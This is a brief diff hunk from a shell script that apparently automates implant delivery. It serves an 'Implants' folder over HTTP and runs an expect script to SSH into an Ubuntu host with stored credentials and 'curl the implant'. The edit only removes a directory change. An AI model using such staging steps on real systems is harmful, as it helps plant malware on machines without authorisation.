@@ -44,7 +44,6 @@ windows_pass=""
 # Serve the Files
 qterminal -e bash -c "cd ~/Desktop/Implants; python -m http.server 8090; exec bash" &
 
-cd ../
 # SSH -> Curl the Implant (Ubuntu)
 ./ConSSH.exp $ip_address $ubuntu_ip $ubuntu_user $ubuntu_pass
 
